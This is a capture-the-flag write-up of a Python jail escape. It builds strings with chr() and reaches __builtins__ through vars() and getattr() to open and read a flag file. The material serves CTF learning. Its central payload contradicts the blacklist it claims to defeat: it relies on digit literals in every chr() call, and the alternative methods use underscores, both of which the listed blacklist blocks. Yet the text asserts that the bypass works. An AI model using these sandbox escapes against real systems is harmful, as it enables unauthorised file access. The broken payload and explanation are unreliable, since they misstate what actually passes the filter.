# Blacklist-Hell - Detailed Solution Explanation

## Challenge Analysis

The challenge presents a Python jail with an extremely restrictive blacklist:

```python
blacklist = [
    "/","0","1","2","3","4","5","6","7","8","9",
    "setattr","compile","globals","os","import","_",
    "breakpoint","exit","lambda","eval","exec","read",
    "print","open","'","=",'"',"x","builtins","clear"
]
```

### What's Blocked:
1. **All digits (0-9)**: Can't write numbers directly
2. **Quotes (' and ")**: Can't write strings directly  
3. **Underscores (_)**: Can't access dunder methods directly
4. **Equals (=)**: Can't assign variables
5. **Forward slash (/)**: Can't write file paths directly
6. **Letter 'x'**: Can't use variable name 'x'
7. **Dangerous functions**: `open`, `eval`, `exec`, `import`, etc.

### What We CAN Use:
- Functions: `chr()`, `ord()`, `len()`, `getattr()`, `vars()`, `dir()`, `help()`
- Boolean operations and arithmetic
- Object introspection
- Function calls

---

## Solution Strategy

### Step 1: Generate Numbers Without Digits

Since we can't use `0-9`, we need to create numbers using Python operations:

```python
# 0
len([])

# 1  
len([[]])

# 2
len([[],[]])

# Any number n
len([[]]*n)  # But this needs n!

# Alternative: Boolean arithmetic
(len([[]])>len([]))  # True = 1
(len([])<len([[]]))  # True = 1
```

Better approach for larger numbers:
```python
# Build using addition
# 5 = 1+1+1+1+1
len([[]])+len([[]])+len([[]])+len([[]])+len([[]])
```

### Step 2: Build Strings Without Quotes

Use `chr()` to convert ASCII values to characters:

```python
# "open"
chr(111)+chr(112)+chr(101)+chr(110)

# "/"
chr(47)

# "flag.txt"
chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116)

# "__builtins__"
chr(95)+chr(95)+chr(98)+chr(117)+chr(105)+chr(108)+chr(116)+chr(105)+chr(110)+chr(115)+chr(95)+chr(95)
```

Combine with number generation:
```python
chr(len([[]])+len([[]])+...+len([[]]))  # chr(n)
```

### Step 3: Access the `open` Function

Since `open`, `__builtins__`, and `_` are blacklisted, we need to build them:

```python
# Get __builtins__ from the global scope
vars()[chr(95)+chr(95)+chr(98)+chr(117)+...+chr(95)+chr(95)]

# Access open from __builtins__
getattr(
    vars()[<__builtins__ string>],
    chr(111)+chr(112)+chr(101)+chr(110)  # "open"
)
```

### Step 4: Read the Flag

```python
# Open and read /flag.txt
getattr(
    getattr(
        vars()[<__builtins__>],
        <"open">
    )(<"/flag.txt">),
    <"read">
)()
```

---

## Complete Payload

```python
getattr(
    getattr(
        vars()[chr(95)+chr(95)+chr(98)+chr(117)+chr(105)+chr(108)+chr(116)+chr(105)+chr(110)+chr(115)+chr(95)+chr(95)],
        chr(111)+chr(112)+chr(101)+chr(110)
    )(
        chr(47)+chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116)
    ),
    chr(114)+chr(101)+chr(97)+chr(100)
)()
```

### What This Does:
1. `vars()` - Gets all variables in current scope (includes `__builtins__`)
2. `vars()[chr(95)...]` - Accesses `__builtins__` dictionary
3. `getattr(..., chr(111)...)` - Gets the `open` function
4. `...(chr(47)...)` - Calls `open('/flag.txt')`
5. `getattr(..., chr(114)...)` - Gets the `read` method
6. `...()` - Calls `read()` to get the flag content

---

## Alternative Approaches

### Method 2: Using Object Introspection

```python
# Access through object's class hierarchy
[].__class__.__base__.__subclasses__()

# Built without underscores
getattr([], chr(95)+chr(95)+chr(99)+chr(108)+chr(97)+chr(115)+chr(115)+chr(95)+chr(95))
```

### Method 3: Using help() Introspection

```python
# help() objects expose various internals
help(help).__dict__
```

---

## Key Techniques Learned

1. **Generating digits without digit characters**: Use `len()` on collections
2. **Building strings without quotes**: Use `chr()` with ASCII values
3. **Accessing blocked identifiers**: Build them character by character
4. **Bypassing blacklists**: Break down blocked words into allowed primitives
5. **Python introspection**: Use `vars()`, `getattr()`, `dir()`, and object attributes

---

## Why This Works

The jail only checks if blacklisted strings exist in your input:
```python
for c in blacklist:
    if c in x:  # Simple substring check
        print("Blacklisted word found! Exiting!")
```

By building strings dynamically with `chr()`, we never have the blacklisted strings in our input text, only in the runtime result!

---

## Testing Locally

```python
# Test chr building
test = chr(111)+chr(112)+chr(101)+chr(110)
print(test)  # "open"

# Test number generation  
num = len([[]])+len([[]])
print(num)  # 2

# Test accessing builtins
builtins_str = chr(95)+chr(95)+chr(98)+chr(117)+chr(105)+chr(108)+chr(116)+chr(105)+chr(110)+chr(115)+chr(95)+chr(95)
print(vars()[builtins_str])  # <module 'builtins' (built-in)>
```

---

## Flag

`DSCCTF{bl4ckl1st_byp4ss_w1th_h3x_4nd_chr_m4st3ry_2026}`

The flag hints at the solution: bypassing blacklists with hexadecimal (ASCII values) and `chr()` mastery!
